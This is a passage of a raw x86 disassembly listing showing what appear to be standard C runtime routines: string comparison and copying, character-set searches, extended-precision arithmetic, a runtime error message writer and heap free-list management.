00003F62  6A09              push byte +0x9
00003F64  E895EDFFFF        call 0x2cfe
00003F69  83C40C            add esp,byte +0xc
00003F6C  5E                pop esi
00003F6D  C3                ret
00003F6E  6A09              push byte +0x9
00003F70  E889EDFFFF        call 0x2cfe
00003F75  59                pop ecx
00003F76  56                push esi
00003F77  6A00              push byte +0x0
00003F79  FF35C0721E00      push dword [0x1e72c0]
00003F7F  FF15D8561E00      call near [0x1e56d8]
00003F85  5E                pop esi
00003F86  C3                ret
00003F87  CC                int3
00003F88  CC                int3
00003F89  CC                int3
00003F8A  CC                int3
00003F8B  CC                int3
00003F8C  CC                int3
00003F8D  CC                int3
00003F8E  CC                int3
00003F8F  CC                int3
00003F90  8B542404          mov edx,[esp+0x4]
00003F94  8B4C2408          mov ecx,[esp+0x8]
00003F98  F7C203000000      test edx,0x3
00003F9E  753C              jnz 0x3fdc
00003FA0  8B02              mov eax,[edx]
00003FA2  3A01              cmp al,[ecx]
00003FA4  752E              jnz 0x3fd4
00003FA6  0AC0              or al,al
00003FA8  7426              jz 0x3fd0
00003FAA  3A6101            cmp ah,[ecx+0x1]
00003FAD  7525              jnz 0x3fd4
00003FAF  0AE4              or ah,ah
00003FB1  741D              jz 0x3fd0
00003FB3  C1E810            shr eax,0x10
00003FB6  3A4102            cmp al,[ecx+0x2]
00003FB9  7519              jnz 0x3fd4
00003FBB  0AC0              or al,al
00003FBD  7411              jz 0x3fd0
00003FBF  3A6103            cmp ah,[ecx+0x3]
00003FC2  7510              jnz 0x3fd4
00003FC4  83C104            add ecx,byte +0x4
00003FC7  83C204            add edx,byte +0x4
00003FCA  0AE4              or ah,ah
00003FCC  75D2              jnz 0x3fa0
00003FCE  8BFF              mov edi,edi
00003FD0  33C0              xor eax,eax
00003FD2  C3                ret
00003FD3  90                nop
00003FD4  1BC0              sbb eax,eax
00003FD6  D1E0              shl eax,1
00003FD8  40                inc eax
00003FD9  C3                ret
00003FDA  8BFF              mov edi,edi
00003FDC  F7C201000000      test edx,0x1
00003FE2  7414              jz 0x3ff8
00003FE4  8A02              mov al,[edx]
00003FE6  42                inc edx
00003FE7  3A01              cmp al,[ecx]
00003FE9  75E9              jnz 0x3fd4
00003FEB  41                inc ecx
00003FEC  0AC0              or al,al
00003FEE  74E0              jz 0x3fd0
00003FF0  F7C202000000      test edx,0x2
00003FF6  74A8              jz 0x3fa0
00003FF8  668B02            mov ax,[edx]
00003FFB  83C202            add edx,byte +0x2
00003FFE  3A01              cmp al,[ecx]
00004000  75D2              jnz 0x3fd4
00004002  0AC0              or al,al
00004004  74CA              jz 0x3fd0
00004006  3A6101            cmp ah,[ecx+0x1]
00004009  75C9              jnz 0x3fd4
0000400B  0AE4              or ah,ah
0000400D  74C1              jz 0x3fd0
0000400F  83C102            add ecx,byte +0x2
00004012  EB8C              jmp short 0x3fa0
00004014  CC                int3
00004015  CC                int3
00004016  CC                int3
00004017  CC                int3
00004018  CC                int3
00004019  CC                int3
0000401A  CC                int3
0000401B  CC                int3
0000401C  CC                int3
0000401D  CC                int3
0000401E  CC                int3
0000401F  CC                int3
00004020  8B4C240C          mov ecx,[esp+0xc]
00004024  57                push edi
00004025  85C9              test ecx,ecx
00004027  747A              jz 0x40a3
00004029  56                push esi
0000402A  53                push ebx
0000402B  8BD9              mov ebx,ecx
0000402D  8B742414          mov esi,[esp+0x14]
00004031  F7C603000000      test esi,0x3
00004037  8B7C2410          mov edi,[esp+0x10]
0000403B  7507              jnz 0x4044
0000403D  C1E902            shr ecx,0x2
00004040  756F              jnz 0x40b1
00004042  EB21              jmp short 0x4065
00004044  8A06              mov al,[esi]
00004046  46                inc esi
00004047  8807              mov [edi],al
00004049  47                inc edi
0000404A  49                dec ecx
0000404B  7425              jz 0x4072
0000404D  84C0              test al,al
0000404F  7429              jz 0x407a
00004051  F7C603000000      test esi,0x3
00004057  75EB              jnz 0x4044
00004059  8BD9              mov ebx,ecx
0000405B  C1E902            shr ecx,0x2
0000405E  7551              jnz 0x40b1
00004060  83E303            and ebx,byte +0x3
00004063  740D              jz 0x4072
00004065  8A06              mov al,[esi]
00004067  46                inc esi
00004068  8807              mov [edi],al
0000406A  47                inc edi
0000406B  84C0              test al,al
0000406D  742F              jz 0x409e
0000406F  4B                dec ebx
00004070  75F3              jnz 0x4065
00004072  8B442410          mov eax,[esp+0x10]
00004076  5B                pop ebx
00004077  5E                pop esi
00004078  5F                pop edi
00004079  C3                ret
0000407A  F7C703000000      test edi,0x3
00004080  7412              jz 0x4094
00004082  8807              mov [edi],al
00004084  47                inc edi
00004085  49                dec ecx
00004086  0F848A000000      jz near 0x4116
0000408C  F7C703000000      test edi,0x3
00004092  75EE              jnz 0x4082
00004094  8BD9              mov ebx,ecx
00004096  C1E902            shr ecx,0x2
00004099  756C              jnz 0x4107
0000409B  8807              mov [edi],al
0000409D  47                inc edi
0000409E  4B                dec ebx
0000409F  75FA              jnz 0x409b
000040A1  5B                pop ebx
000040A2  5E                pop esi
000040A3  8B442408          mov eax,[esp+0x8]
000040A7  5F                pop edi
000040A8  C3                ret
000040A9  8917              mov [edi],edx
000040AB  83C704            add edi,byte +0x4
000040AE  49                dec ecx
000040AF  74AF              jz 0x4060
000040B1  BAFFFEFE7E        mov edx,0x7efefeff
000040B6  8B06              mov eax,[esi]
000040B8  03D0              add edx,eax
000040BA  83F0FF            xor eax,byte -0x1
000040BD  33C2              xor eax,edx
000040BF  8B16              mov edx,[esi]
000040C1  83C604            add esi,byte +0x4
000040C4  A900010181        test eax,0x81010100
000040C9  74DE              jz 0x40a9
000040CB  84D2              test dl,dl
000040CD  742C              jz 0x40fb
000040CF  84F6              test dh,dh
000040D1  741E              jz 0x40f1
000040D3  F7C20000FF00      test edx,0xff0000
000040D9  740C              jz 0x40e7
000040DB  F7C2000000FF      test edx,0xff000000
000040E1  75C6              jnz 0x40a9
000040E3  8917              mov [edi],edx
000040E5  EB18              jmp short 0x40ff
000040E7  81E2FFFF0000      and edx,0xffff
000040ED  8917              mov [edi],edx
000040EF  EB0E              jmp short 0x40ff
000040F1  81E2FF000000      and edx,0xff
000040F7  8917              mov [edi],edx
000040F9  EB04              jmp short 0x40ff
000040FB  33D2              xor edx,edx
000040FD  8917              mov [edi],edx
000040FF  83C704            add edi,byte +0x4
00004102  33C0              xor eax,eax
00004104  49                dec ecx
00004105  740A              jz 0x4111
00004107  33C0              xor eax,eax
00004109  8907              mov [edi],eax
0000410B  83C704            add edi,byte +0x4
0000410E  49                dec ecx
0000410F  75F8              jnz 0x4109
00004111  83E303            and ebx,byte +0x3
00004114  7585              jnz 0x409b
00004116  8B442410          mov eax,[esp+0x10]
0000411A  5B                pop ebx
0000411B  5E                pop esi
0000411C  5F                pop edi
0000411D  C3                ret
0000411E  CC                int3
0000411F  CC                int3
00004120  55                push ebp
00004121  8BEC              mov ebp,esp
00004123  56                push esi
00004124  33C0              xor eax,eax
00004126  50                push eax
00004127  50                push eax
00004128  50                push eax
00004129  50                push eax
0000412A  50                push eax
0000412B  50                push eax
0000412C  50                push eax
0000412D  50                push eax
0000412E  8B550C            mov edx,[ebp+0xc]
00004131  8D4900            lea ecx,[ecx+0x0]
00004134  8A02              mov al,[edx]
00004136  0AC0              or al,al
00004138  7407              jz 0x4141
0000413A  42                inc edx
0000413B  0FAB0424          bts [esp],eax
0000413F  EBF3              jmp short 0x4134
00004141  8B7508            mov esi,[ebp+0x8]
00004144  83C9FF            or ecx,byte -0x1
00004147  90                nop
00004148  41                inc ecx
00004149  8A06              mov al,[esi]
0000414B  0AC0              or al,al
0000414D  7407              jz 0x4156
0000414F  46                inc esi
00004150  0FA30424          bt [esp],eax
00004154  73F2              jnc 0x4148
00004156  8BC1              mov eax,ecx
00004158  83C420            add esp,byte +0x20
0000415B  5E                pop esi
0000415C  C9                leave
0000415D  C3                ret
0000415E  CC                int3
0000415F  CC                int3
00004160  55                push ebp
00004161  8BEC              mov ebp,esp
00004163  57                push edi
00004164  56                push esi
00004165  53                push ebx
00004166  8B4D10            mov ecx,[ebp+0x10]
00004169  E326              jecxz 0x4191
0000416B  8BD9              mov ebx,ecx
0000416D  8B7D08            mov edi,[ebp+0x8]
00004170  8BF7              mov esi,edi
00004172  33C0              xor eax,eax
00004174  F2AE              repne scasb
00004176  F7D9              neg ecx
00004178  03CB              add ecx,ebx
0000417A  8BFE              mov edi,esi
0000417C  8B750C            mov esi,[ebp+0xc]
0000417F  F3A6              repe cmpsb
00004181  8A46FF            mov al,[esi-0x1]
00004184  33C9              xor ecx,ecx
00004186  3A47FF            cmp al,[edi-0x1]
00004189  7704              ja 0x418f
0000418B  7404              jz 0x4191
0000418D  49                dec ecx
0000418E  49                dec ecx
0000418F  F7D1              not ecx
00004191  8BC1              mov eax,ecx
00004193  5B                pop ebx
00004194  5E                pop esi
00004195  5F                pop edi
00004196  C9                leave
00004197  C3                ret
00004198  CC                int3
00004199  CC                int3
0000419A  CC                int3
0000419B  CC                int3
0000419C  CC                int3
0000419D  CC                int3
0000419E  CC                int3
0000419F  CC                int3
000041A0  55                push ebp
000041A1  8BEC              mov ebp,esp
000041A3  56                push esi
000041A4  33C0              xor eax,eax
000041A6  50                push eax
000041A7  50                push eax
000041A8  50                push eax
000041A9  50                push eax
000041AA  50                push eax
000041AB  50                push eax
000041AC  50                push eax
000041AD  50                push eax
000041AE  8B550C            mov edx,[ebp+0xc]
000041B1  8D4900            lea ecx,[ecx+0x0]
000041B4  8A02              mov al,[edx]
000041B6  0AC0              or al,al
000041B8  7407              jz 0x41c1
000041BA  42                inc edx
000041BB  0FAB0424          bts [esp],eax
000041BF  EBF3              jmp short 0x41b4
000041C1  8B7508            mov esi,[ebp+0x8]
000041C4  8A06              mov al,[esi]
000041C6  0AC0              or al,al
000041C8  740A              jz 0x41d4
000041CA  46                inc esi
000041CB  0FA30424          bt [esp],eax
000041CF  73F3              jnc 0x41c4
000041D1  8D46FF            lea eax,[esi-0x1]
000041D4  83C420            add esp,byte +0x20
000041D7  5E                pop esi
000041D8  C9                leave
000041D9  C3                ret
000041DA  55                push ebp
000041DB  8BEC              mov ebp,esp
000041DD  83EC24            sub esp,byte +0x24
000041E0  53                push ebx
000041E1  8B5D0C            mov ebx,[ebp+0xc]
000041E4  56                push esi
000041E5  8B7508            mov esi,[ebp+0x8]
000041E8  668B4B0A          mov cx,[ebx+0xa]
000041EC  33C0              xor eax,eax
000041EE  57                push edi
000041EF  8945EC            mov [ebp-0x14],eax
000041F2  8945DC            mov [ebp-0x24],eax
000041F5  8945E0            mov [ebp-0x20],eax
000041F8  8945E4            mov [ebp-0x1c],eax
000041FB  668B460A          mov ax,[esi+0xa]
000041FF  8BF9              mov edi,ecx
00004201  BAFF7F0000        mov edx,0x7fff
00004206  33F8              xor edi,eax
00004208  23C2              and eax,edx
0000420A  23CA              and ecx,edx
0000420C  81E700800000      and edi,0x8000
00004212  663DFF7F          cmp ax,0x7fff
00004216  8D1401            lea edx,[ecx+eax]
00004219  895508            mov [ebp+0x8],edx
0000421C  0F83B8010000      jnc near 0x43da
00004222  6681F9FF7F        cmp cx,0x7fff
00004227  0F83AD010000      jnc near 0x43da
0000422D  6681FAFDBF        cmp dx,0xbffd
00004232  0F87A2010000      ja near 0x43da
00004238  6681FABF3F        cmp dx,0x3fbf
0000423D  7704              ja 0x4243
0000423F  33C0              xor eax,eax
00004241  EB3A              jmp short 0x427d
00004243  6685C0            test ax,ax
00004246  BAFFFFFF7F        mov edx,0x7fffffff
0000424B  7518              jnz 0x4265
0000424D  FF4508            inc dword [ebp+0x8]
00004250  855608            test [esi+0x8],edx
00004253  7510              jnz 0x4265
00004255  33C0              xor eax,eax
00004257  394604            cmp [esi+0x4],eax
0000425A  750B              jnz 0x4267
0000425C  3906              cmp [esi],eax
0000425E  7507              jnz 0x4267
00004260  E96F010000        jmp 0x43d4
00004265  33C0              xor eax,eax
00004267  663BC8            cmp cx,ax
0000426A  751E              jnz 0x428a
0000426C  FF4508            inc dword [ebp+0x8]
0000426F  855308            test [ebx+0x8],edx
00004272  7516              jnz 0x428a
00004274  394304            cmp [ebx+0x4],eax
00004277  7511              jnz 0x428a
00004279  3903              cmp [ebx],eax
0000427B  750D              jnz 0x428a
0000427D  894608            mov [esi+0x8],eax
00004280  894604            mov [esi+0x4],eax
00004283  8906              mov [esi],eax
00004285  E96B010000        jmp 0x43f5
0000428A  8945F0            mov [ebp-0x10],eax
0000428D  8D45E0            lea eax,[ebp-0x20]
00004290  8945FC            mov [ebp-0x4],eax
00004293  C7450C05000000    mov dword [ebp+0xc],0x5
0000429A  8B45F0            mov eax,[ebp-0x10]
0000429D  03C0              add eax,eax
0000429F  837D0C00          cmp dword [ebp+0xc],byte +0x0
000042A3  7E49              jng 0x42ee
000042A5  03C6              add eax,esi
000042A7  8D4B08            lea ecx,[ebx+0x8]
000042AA  8945F8            mov [ebp-0x8],eax
000042AD  8B450C            mov eax,[ebp+0xc]
000042B0  894DF4            mov [ebp-0xc],ecx
000042B3  8945E8            mov [ebp-0x18],eax
000042B6  8B45F8            mov eax,[ebp-0x8]
000042B9  8B4DF4            mov ecx,[ebp-0xc]
000042BC  0FB700            movzx eax,word [eax]
000042BF  0FB709            movzx ecx,word [ecx]
000042C2  0FAFC1            imul eax,ecx
000042C5  8B4DFC            mov ecx,[ebp-0x4]
000042C8  83C1FC            add ecx,byte -0x4
000042CB  51                push ecx
000042CC  50                push eax
000042CD  FF31              push dword [ecx]
000042CF  E88EECFFFF        call 0x2f62
000042D4  83C40C            add esp,byte +0xc
000042D7  85C0              test eax,eax
000042D9  7406              jz 0x42e1
000042DB  8B45FC            mov eax,[ebp-0x4]
000042DE  66FF00            inc word [eax]
000042E1  8345F802          add dword [ebp-0x8],byte +0x2
000042E5  836DF402          sub dword [ebp-0xc],byte +0x2
000042E9  FF4DE8            dec dword [ebp-0x18]
000042EC  75C8              jnz 0x42b6
000042EE  8345FC02          add dword [ebp-0x4],byte +0x2
000042F2  FF45F0            inc dword [ebp-0x10]
000042F5  FF4D0C            dec dword [ebp+0xc]
000042F8  837D0C00          cmp dword [ebp+0xc],byte +0x0
000042FC  7F9C              jg 0x429a
000042FE  81450802C00000    add dword [ebp+0x8],0xc002
00004305  66837D0800        cmp word [ebp+0x8],byte +0x0
0000430A  7E25              jng 0x4331
0000430C  F645E780          test byte [ebp-0x19],0x80
00004310  7518              jnz 0x432a
00004312  8D45DC            lea eax,[ebp-0x24]
00004315  50                push eax
00004316  E8C6ECFFFF        call 0x2fe1
0000431B  814508FFFF0000    add dword [ebp+0x8],0xffff
00004322  59                pop ecx
00004323  66837D0800        cmp word [ebp+0x8],byte +0x0
00004328  7FE2              jg 0x430c
0000432A  66837D0800        cmp word [ebp+0x8],byte +0x0
0000432F  7F39              jg 0x436a
00004331  814508FFFF0000    add dword [ebp+0x8],0xffff
00004338  66837D0800        cmp word [ebp+0x8],byte +0x0
0000433D  7D2B              jnl 0x436a
0000433F  0FBF4508          movsx eax,word [ebp+0x8]
00004343  F7D8              neg eax
00004345  014508            add [ebp+0x8],eax
00004348  8BD8              mov ebx,eax
0000434A  F645DC01          test byte [ebp-0x24],0x1
0000434E  7403              jz 0x4353
00004350  FF45EC            inc dword [ebp-0x14]
00004353  8D45DC            lea eax,[ebp-0x24]
00004356  50                push eax
00004357  E8B3ECFFFF        call 0x300f
0000435C  4B                dec ebx
0000435D  59                pop ecx
0000435E  75EA              jnz 0x434a
00004360  837DEC00          cmp dword [ebp-0x14],byte +0x0
00004364  7404              jz 0x436a
00004366  804DDC01          or byte [ebp-0x24],0x1
0000436A  66817DDC0080      cmp word [ebp-0x24],0x8000
00004370  770F              ja 0x4381
00004372  8B45DC            mov eax,[ebp-0x24]
00004375  25FFFF0100        and eax,0x1ffff
0000437A  3D00800100        cmp eax,0x18000
0000437F  7535              jnz 0x43b6
00004381  837DDEFF          cmp dword [ebp-0x22],byte -0x1
00004385  752C              jnz 0x43b3
00004387  8365DE00          and dword [ebp-0x22],byte +0x0
0000438B  837DE2FF          cmp dword [ebp-0x1e],byte -0x1
0000438F  751D              jnz 0x43ae
00004391  8365E200          and dword [ebp-0x1e],byte +0x0
00004395  66817DE6FFFF      cmp word [ebp-0x1a],0xffff
0000439B  750B              jnz 0x43a8
0000439D  FF4508            inc dword [ebp+0x8]
000043A0  66C745E60080      mov word [ebp-0x1a],0x8000
000043A6  EB0E              jmp short 0x43b6
000043A8  66FF45E6          inc word [ebp-0x1a]
000043AC  EB08              jmp short 0x43b6
000043AE  FF45E2            inc dword [ebp-0x1e]
000043B1  EB03              jmp short 0x43b6
000043B3  FF45DE            inc dword [ebp-0x22]
000043B6  8B4508            mov eax,[ebp+0x8]
000043B9  663DFF7F          cmp ax,0x7fff
000043BD  731B              jnc 0x43da
000043BF  668B4DDE          mov cx,[ebp-0x22]
000043C3  0BC7              or eax,edi
000043C5  66890E            mov [esi],cx
000043C8  8B4DE0            mov ecx,[ebp-0x20]
000043CB  894E02            mov [esi+0x2],ecx
000043CE  8B4DE4            mov ecx,[ebp-0x1c]
000043D1  894E06            mov [esi+0x6],ecx
000043D4  6689460A          mov [esi+0xa],ax
000043D8  EB1B              jmp short 0x43f5
000043DA  66F7DF            neg di
000043DD  1BFF              sbb edi,edi
000043DF  83660400          and dword [esi+0x4],byte +0x0
000043E3  81E700000080      and edi,0x80000000
000043E9  81C70080FF7F      add edi,0x7fff8000
000043EF  832600            and dword [esi],byte +0x0
000043F2  897E08            mov [esi+0x8],edi
000043F5  5F                pop edi
000043F6  5E                pop esi
000043F7  5B                pop ebx
000043F8  C9                leave
000043F9  C3                ret
000043FA  55                push ebp
000043FB  8BEC              mov ebp,esp
000043FD  83EC0C            sub esp,byte +0xc
00004400  53                push ebx
00004401  BB30681E00        mov ebx,0x1e6830
00004406  33C9              xor ecx,ecx
00004408  83EB60            sub ebx,byte +0x60
0000440B  394D0C            cmp [ebp+0xc],ecx
0000440E  7463              jz 0x4473
00004410  7D10              jnl 0x4422
00004412  8B450C            mov eax,[ebp+0xc]
00004415  BB90691E00        mov ebx,0x1e6990
0000441A  F7D8              neg eax
0000441C  89450C            mov [ebp+0xc],eax
0000441F  83EB60            sub ebx,byte +0x60
00004422  394D10            cmp [ebp+0x10],ecx
00004425  7506              jnz 0x442d
00004427  8B4508            mov eax,[ebp+0x8]
0000442A  668908            mov [eax],cx
0000442D  394D0C            cmp [ebp+0xc],ecx
00004430  7441              jz 0x4473
00004432  56                push esi
00004433  57                push edi
00004434  8B450C            mov eax,[ebp+0xc]
00004437  83C354            add ebx,byte +0x54
0000443A  C17D0C03          sar dword [ebp+0xc],0x3
0000443E  83E007            and eax,byte +0x7
00004441  3BC1              cmp eax,ecx
00004443  7427              jz 0x446c
00004445  8D0440            lea eax,[eax+eax*2]
00004448  66813C830080      cmp word [ebx+eax*4],0x8000
0000444E  8D3483            lea esi,[ebx+eax*4]
00004451  720C              jc 0x445f
00004453  8D7DF4            lea edi,[ebp-0xc]
00004456  A5                movsd
00004457  A5                movsd
00004458  A5                movsd
00004459  FF4DF6            dec dword [ebp-0xa]
0000445C  8D75F4            lea esi,[ebp-0xc]
0000445F  56                push esi
00004460  FF7508            push dword [ebp+0x8]
00004463  E872FDFFFF        call 0x41da
00004468  59                pop ecx
00004469  59                pop ecx
0000446A  33C9              xor ecx,ecx
0000446C  394D0C            cmp [ebp+0xc],ecx
0000446F  75C3              jnz 0x4434
00004471  5F                pop edi
00004472  5E                pop esi
00004473  5B                pop ebx
00004474  C9                leave
00004475  C3                ret
00004476  A1C86D1E00        mov eax,[0x1e6dc8]
0000447B  83F801            cmp eax,byte +0x1
0000447E  740D              jz 0x448d
00004480  85C0              test eax,eax
00004482  752A              jnz 0x44ae
00004484  833D60641E0001    cmp dword [0x1e6460],byte +0x1
0000448B  7521              jnz 0x44ae
0000448D  68FC000000        push dword 0xfc
00004492  E818000000        call 0x44af
00004497  A17C6F1E00        mov eax,[0x1e6f7c]
0000449C  59                pop ecx
0000449D  85C0              test eax,eax
0000449F  7402              jz 0x44a3
000044A1  FFD0              call eax
000044A3  68FF000000        push dword 0xff
000044A8  E802000000        call 0x44af
000044AD  59                pop ecx
000044AE  C3                ret
000044AF  55                push ebp
000044B0  8BEC              mov ebp,esp
000044B2  81ECA4010000      sub esp,0x1a4
000044B8  8B5508            mov edx,[ebp+0x8]
000044BB  33C9              xor ecx,ecx
000044BD  B8A8661E00        mov eax,0x1e66a8
000044C2  3B10              cmp edx,[eax]
000044C4  740B              jz 0x44d1
000044C6  83C008            add eax,byte +0x8
000044C9  41                inc ecx
000044CA  3D38671E00        cmp eax,0x1e6738
000044CF  7CF1              jl 0x44c2
000044D1  56                push esi
000044D2  8BF1              mov esi,ecx
000044D4  C1E603            shl esi,0x3
000044D7  3B96A8661E00      cmp edx,[esi+0x1e66a8]
000044DD  0F851C010000      jnz near 0x45ff
000044E3  A1C86D1E00        mov eax,[0x1e6dc8]
000044E8  83F801            cmp eax,byte +0x1
000044EB  0F84E8000000      jz near 0x45d9
000044F1  85C0              test eax,eax
000044F3  750D              jnz 0x4502
000044F5  833D60641E0001    cmp dword [0x1e6460],byte +0x1
000044FC  0F84D7000000      jz near 0x45d9
00004502  81FAFC000000      cmp edx,0xfc
00004508  0F84F1000000      jz near 0x45ff
0000450E  8D855CFEFFFF      lea eax,[ebp+0xfffffe5c]
00004514  6804010000        push dword 0x104
00004519  50                push eax
0000451A  6A00              push byte +0x0
0000451C  FF15E0561E00      call near [0x1e56e0]
00004522  85C0              test eax,eax
00004524  7513              jnz 0x4539
00004526  8D855CFEFFFF      lea eax,[ebp+0xfffffe5c]
0000452C  68A05A1E00        push dword 0x1e5aa0
00004531  50                push eax
00004532  E809E1FFFF        call 0x2640
00004537  59                pop ecx
00004538  59                pop ecx
00004539  8D855CFEFFFF      lea eax,[ebp+0xfffffe5c]
0000453F  57                push edi
00004540  50                push eax
00004541  8DBD5CFEFFFF      lea edi,[ebp+0xfffffe5c]
00004547  E884E5FFFF        call 0x2ad0
0000454C  40                inc eax
0000454D  59                pop ecx
0000454E  83F83C            cmp eax,byte +0x3c
00004551  7629              jna 0x457c
00004553  8D855CFEFFFF      lea eax,[ebp+0xfffffe5c]
00004559  50                push eax
0000455A  E871E5FFFF        call 0x2ad0
0000455F  8BF8              mov edi,eax
00004561  8D855CFEFFFF      lea eax,[ebp+0xfffffe5c]
00004567  83E83B            sub eax,byte +0x3b
0000456A  6A03              push byte +0x3
0000456C  03F8              add edi,eax
0000456E  689C5A1E00        push dword 0x1e5a9c
00004573  57                push edi
00004574  E8A7FAFFFF        call 0x4020
00004579  83C410            add esp,byte +0x10
0000457C  8D8560FFFFFF      lea eax,[ebp+0xffffff60]
00004582  68805A1E00        push dword 0x1e5a80
00004587  50                push eax
00004588  E8B3E0FFFF        call 0x2640
0000458D  8D8560FFFFFF      lea eax,[ebp+0xffffff60]
00004593  57                push edi
00004594  50                push eax
00004595  E8B6E0FFFF        call 0x2650
0000459A  8D8560FFFFFF      lea eax,[ebp+0xffffff60]
000045A0  687C5A1E00        push dword 0x1e5a7c
000045A5  50                push eax
000045A6  E8A5E0FFFF        call 0x2650
000045AB  FFB6AC661E00      push dword [esi+0x1e66ac]
000045B1  8D8560FFFFFF      lea eax,[ebp+0xffffff60]
000045B7  50                push eax
000045B8  E893E0FFFF        call 0x2650
000045BD  6810200100        push dword 0x12010
000045C2  8D8560FFFFFF      lea eax,[ebp+0xffffff60]
000045C8  68545A1E00        push dword 0x1e5a54
000045CD  50                push eax
000045CE  E8220E0000        call 0x53f5
000045D3  83C42C            add esp,byte +0x2c
000045D6  5F                pop edi
000045D7  EB26              jmp short 0x45ff
000045D9  8D4508            lea eax,[ebp+0x8]
000045DC  8DB6AC661E00      lea esi,[esi+0x1e66ac]
000045E2  6A00              push byte +0x0
000045E4  50                push eax
000045E5  FF36              push dword [esi]
000045E7  E8E4E4FFFF        call 0x2ad0
000045EC  59                pop ecx
000045ED  50                push eax
000045EE  FF36              push dword [esi]
000045F0  6AF4              push byte -0xc
000045F2  FF15E4561E00      call near [0x1e56e4]
000045F8  50                push eax
000045F9  FF15EC561E00      call near [0x1e56ec]
000045FF  5E                pop esi
00004600  C9                leave
00004601  C3                ret
00004602  A1846F1E00        mov eax,[0x1e6f84]
00004607  85C0              test eax,eax
00004609  740F              jz 0x461a
0000460B  FF742404          push dword [esp+0x4]
0000460F  FFD0              call eax
00004611  85C0              test eax,eax
00004613  59                pop ecx
00004614  7404              jz 0x461a
00004616  6A01              push byte +0x1
00004618  58                pop eax
00004619  C3                ret
0000461A  33C0              xor eax,eax
0000461C  C3                ret
0000461D  A1B8721E00        mov eax,[0x1e72b8]
00004622  8D0C80            lea ecx,[eax+eax*4]
00004625  A1BC721E00        mov eax,[0x1e72bc]
0000462A  8D0C88            lea ecx,[eax+ecx*4]
0000462D  3BC1              cmp eax,ecx
0000462F  7314              jnc 0x4645
00004631  8B542404          mov edx,[esp+0x4]
00004635  2B500C            sub edx,[eax+0xc]
00004638  81FA00001000      cmp edx,0x100000
0000463E  7207              jc 0x4647
00004640  83C014            add eax,byte +0x14
00004643  EBE8              jmp short 0x462d
00004645  33C0              xor eax,eax
00004647  C3                ret
00004648  55                push ebp
00004649  8BEC              mov ebp,esp
0000464B  83EC14            sub esp,byte +0x14
0000464E  8B550C            mov edx,[ebp+0xc]
00004651  8B4D08            mov ecx,[ebp+0x8]
00004654  53                push ebx
00004655  56                push esi
00004656  8B4110            mov eax,[ecx+0x10]
00004659  8BF2              mov esi,edx
0000465B  2B710C            sub esi,[ecx+0xc]
0000465E  8B5AFC            mov ebx,[edx-0x4]
00004661  83C2FC            add edx,byte -0x4
00004664  57                push edi
00004665  C1EE0F            shr esi,0xf
00004668  8BCE              mov ecx,esi
0000466A  8B7AFC            mov edi,[edx-0x4]
0000466D  69C904020000      imul ecx,ecx,dword 0x204
00004673  4B                dec ebx
00004674  897DFC            mov [ebp-0x4],edi
00004677  8D8C0144010000    lea ecx,[ecx+eax+0x144]
0000467E  895DF4            mov [ebp-0xc],ebx
00004681  894DF0            mov [ebp-0x10],ecx
00004684  8B0C13            mov ecx,[ebx+edx]
00004687  F6C101            test cl,0x1
0000468A  894DF8            mov [ebp-0x8],ecx
0000468D  757F              jnz 0x470e
0000468F  C1F904            sar ecx,0x4
00004692  6A3F              push byte +0x3f
00004694  49                dec ecx
00004695  5F                pop edi
00004696  894D0C            mov [ebp+0xc],ecx
00004699  3BCF              cmp ecx,edi
0000469B  7603              jna 0x46a0
0000469D  897D0C            mov [ebp+0xc],edi
000046A0  8B4C1304          mov ecx,[ebx+edx+0x4]
000046A4  3B4C1308          cmp ecx,[ebx+edx+0x8]
000046A8  7548              jnz 0x46f2
000046AA  8B4D0C            mov ecx,[ebp+0xc]
000046AD  83F920            cmp ecx,byte +0x20
000046B0  731C              jnc 0x46ce
000046B2  BF00000080        mov edi,0x80000000
000046B7  D3EF              shr edi,cl
000046B9  8D4C0104          lea ecx,[ecx+eax+0x4]
000046BD  F7D7              not edi
000046BF  217CB044          and [eax+esi*4+0x44],edi
000046C3  FE09              dec byte [ecx]
000046C5  752B              jnz 0x46f2
000046C7  8B4D08            mov ecx,[ebp+0x8]
000046CA  2139              and [ecx],edi
000046CC  EB24              jmp short 0x46f2
000046CE  83C1E0            add ecx,byte -0x20
000046D1  BF00000080        mov edi,0x80000000
000046D6  D3EF              shr edi,cl
000046D8  8B4D0C            mov ecx,[ebp+0xc]
000046DB  8D4C0104          lea ecx,[ecx+eax+0x4]
000046DF  F7D7              not edi
000046E1  21BCB0C4000000    and [eax+esi*4+0xc4],edi
000046E8  FE09              dec byte [ecx]
000046EA  7506              jnz 0x46f2
000046EC  8B4D08            mov ecx,[ebp+0x8]
000046EF  217904            and [ecx+0x4],edi
000046F2  8B4C1308          mov ecx,[ebx+edx+0x8]
000046F6  8B7C1304          mov edi,[ebx+edx+0x4]
000046FA  897904            mov [ecx+0x4],edi
000046FD  8B4C1304          mov ecx,[ebx+edx+0x4]
00004701  8B7C1308          mov edi,[ebx+edx+0x8]
00004705  035DF8            add ebx,[ebp-0x8]
00004708  897908            mov [ecx+0x8],edi
0000470B  895DF4            mov [ebp-0xc],ebx
0000470E  8BFB              mov edi,ebx
00004710  C1FF04            sar edi,0x4
00004713  4F                dec edi
00004714  83FF3F            cmp edi,byte +0x3f
00004717  7603              jna 0x471c
00004719  6A3F              push byte +0x3f
0000471B  5F                pop edi
0000471C  8B4DFC            mov ecx,[ebp-0x4]
0000471F  83E101            and ecx,byte +0x1
00004722  894DEC            mov [ebp-0x14],ecx
00004725  0F85A0000000      jnz near 0x47cb
0000472B  2B55FC            sub edx,[ebp-0x4]
0000472E  8B4DFC            mov ecx,[ebp-0x4]
00004731  C1F904            sar ecx,0x4
00004734  6A3F              push byte +0x3f
00004736  8955F8            mov [ebp-0x8],edx
00004739  49                dec ecx
0000473A  5A                pop edx
0000473B  3BCA              cmp ecx,edx
0000473D  894D0C            mov [ebp+0xc],ecx
00004740  7605              jna 0x4747
00004742  89550C            mov [ebp+0xc],edx
00004745  8BCA              mov ecx,edx
00004747  035DFC            add ebx,[ebp-0x4]
0000474A  8BFB              mov edi,ebx
0000474C  895DF4            mov [ebp-0xc],ebx
0000474F  C1FF04            sar edi,0x4
00004752  4F                dec edi
00004753  3BFA              cmp edi,edx
00004755  7602              jna 0x4759
00004757  8BFA              mov edi,edx
00004759  3BCF              cmp ecx,edi
0000475B  746B              jz 0x47c8
0000475D  8B4DF8            mov ecx,[ebp-0x8]
00004760  8B5104            mov edx,[ecx+0x4]
00004763  3B5108            cmp edx,[ecx+0x8]
00004766  7548              jnz 0x47b0
00004768  8B4D0C            mov ecx,[ebp+0xc]
